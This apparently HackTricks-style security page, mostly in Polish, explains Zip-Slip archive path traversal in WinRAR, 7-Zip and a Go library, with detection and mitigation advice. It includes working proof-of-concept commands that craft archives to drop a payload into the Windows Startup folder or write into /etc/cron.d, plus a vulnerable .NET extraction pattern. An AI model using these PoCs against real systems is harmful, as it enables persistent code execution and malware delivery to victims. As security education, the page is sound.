# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Przegląd

Wiele formatów archiwów (ZIP, RAR, TAR, 7-ZIP, itp.) pozwala każdemu wpisowi na zawarcie własnej **wewnętrznej ścieżki**. Gdy narzędzie do ekstrakcji bezkrytycznie respektuje tę ścieżkę, spreparowana nazwa pliku zawierająca `..` lub **absolutną ścieżkę** (np. `C:\Windows\System32\`) zostanie zapisana poza katalogiem wybranym przez użytkownika.
Ta klasa podatności jest powszechnie znana jako *Zip-Slip* lub **archive extraction path traversal**.

Konsekwencje mogą obejmować nadpisanie dowolnych plików lub bezpośrednie osiągnięcie **remote code execution (RCE)** poprzez umieszczenie payload w lokalizacji uruchamianej automatycznie (auto-run), takiej jak Windows *Startup* folder.

## Przyczyna

1. Atakujący tworzy archiwum, w którym jeden lub więcej nagłówków plików zawiera:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **dowiązania symboliczne** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Ofiara rozpakowuje archiwum za pomocą podatnego narzędzia, które ufa osadzonej ścieżce (lub podąża za dowiązaniami symbolicznymi) zamiast jej oczyszczać lub wymuszać rozpakowanie wewnątrz wybranego katalogu.
3. Plik zostaje zapisany w lokalizacji kontrolowanej przez atakującego i zostanie uruchomiony/załadowany przy następnym wywołaniu tej ścieżki przez system lub użytkownika.

### .NET `Path.Combine` + `ZipArchive` traversal

Powszechny antywzorzec w .NET polega na łączeniu docelowej ścieżki z **kontrolowaną przez użytkownika** wartością `ZipArchiveEntry.FullName` i rozpakowywaniu bez normalizacji ścieżek:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Jeśli `entry.FullName` zaczyna się od `..\\`, następuje path traversal; jeśli jest to **absolute path** lewa składowa jest całkowicie odrzucona, co skutkuje **arbitrary file write** jako extraction identity.
- Przykładowe archiwum proof-of-concept do zapisania w sąsiednim katalogu `app` monitorowanym przez zaplanowany skaner:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Upuszczenie tego pliku ZIP do monitorowanej skrzynki powoduje utworzenie `C:\samples\app\0xdf.txt`, potwierdzając traversal poza `C:\samples\queue\` i umożliwiając follow-on primitives (np. DLL hijacks).

## Przykład z rzeczywistego świata – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (w tym `rar` / `unrar` CLI, DLL i przenośne źródła) nie weryfikował nazw plików podczas rozpakowywania.
Złośliwe archiwum RAR zawierające wpis taki jak:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
trafi **poza** wybranym katalogiem wyjściowym, do folderu *Startup* użytkownika. Po zalogowaniu Windows automatycznie uruchamia wszystko, co się tam znajduje, zapewniając *trwałe* RCE.

### Tworzenie archiwum PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – przechowuj ścieżki plików dokładnie tak, jak podane (nie **usuwaj** wiodącego `./`).

Dostarcz `evil.rar` ofierze i poleć jej rozpakować go przy użyciu podatnej wersji WinRAR.

### Zaobserwowane wykorzystania w środowisku

ESET zgłosił kampanie spear-phishing RomCom (Storm-0978/UNC2596), które załączały archiwa RAR wykorzystujące CVE-2025-8088 do wdrażania spersonalizowanych backdoors i ułatwiania operacji ransomware.

## Nowsze przypadki (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Błąd**: wpisy ZIP będące linkami symbolicznymi były dereferencjonowane podczas rozpakowywania, co pozwalało atakującemu wydostać się poza katalog docelowy i nadpisać dowolne ścieżki. Interakcja użytkownika to tylko *otwarcie/rozpakowanie* archiwum.
* **Dotknięte**: 7-Zip 21.02–24.09 (buildy Windows i Linux). Naprawione w **25.00** (lipiec 2025) i nowszych.
* **Skutek / wektor ataku**: nadpisanie `Start Menu/Programs/Startup` lub lokalizacji uruchamianych przez usługę → kod uruchomi się przy następnym logowaniu lub restarcie usługi.
* **Szybki PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Na poprawionym buildzie `/etc/cron.d` nie zostanie naruszony; link symboliczny zostanie wypakowany jako link wewnątrz /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Błąd**: `archiver.Unarchive()` podążał za `../` i linkami symbolicznymi w wpisach ZIP, zapisując poza `outputDir`.
* **Dotknięte**: `github.com/mholt/archiver` ≤ 3.5.1 (projekt obecnie przestarzały).
* **Poprawka**: Przejść na `mholt/archives` ≥ 0.1.0 lub wprowadzić sprawdzanie kanonicznej ścieżki przed zapisem.
* **Minimalna reprodukcja**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Wskazówki wykrywania

* **Inspekcja statyczna** – Wypisz wpisy archiwum i oznacz dowolną nazwę zawierającą `../`, `..\\`, *absolute paths* (`/`, `C:`) lub wpisy typu *symlink*, których cel znajduje się poza katalogiem rozpakowania.
* **Kanoniczacja** – Upewnij się, że `realpath(join(dest, name))` nadal zaczyna się od `dest`. Odrzuć w przeciwnym wypadku.
* **Rozpakowywanie w piaskownicy** – Dekompresuj do tymczasowego katalogu przy użyciu *bezpiecznego* ekstraktora (np. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i zweryfikuj, że powstałe ścieżki pozostają w obrębie tego katalogu.
* **Monitorowanie punktów końcowych** – Generuj alerty przy nowych plikach wykonywalnych zapisanych w lokalizacjach `Startup`/`Run`/`cron` wkrótce po otwarciu archiwum przez WinRAR/7-Zip/itp.

## Łagodzenie i utwardzanie

1. **Aktualizuj ekstraktor** – WinRAR 7.13+ i 7-Zip 25.00+ implementują sanitizację ścieżek/linków symbolicznych. Oba narzędzia nadal nie mają auto-update.
2. Rozpakowuj archiwa z opcją “**Do not extract paths**” / “**Ignore paths**” kiedy to możliwe.
3. Na Unixie obniż uprawnienia i zamontuj **chroot/namespace** przed rozpakowywaniem; na Windows użyj **AppContainer** lub piaskownicy.
4. Jeśli piszesz własny kod, normalizuj za pomocą `realpath()`/`PathCanonicalize()` **przed** tworzeniem/zapisem i odrzucaj każdy wpis, który wydostaje się poza katalog docelowy.

## Dodatkowo dotknięte / przypadki historyczne

* 2018 – Ogromne ostrzeżenie *Zip-Slip* od Snyk wpływające na wiele bibliotek Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 — podobna traversala podczas `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) — traversala przy ekstrakcji TAR w slugs (łatka w v1.2).
* Każda niestandardowa logika rozpakowywania, która nie wywołuje `PathCanonicalize` / `realpath` przed zapisem.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
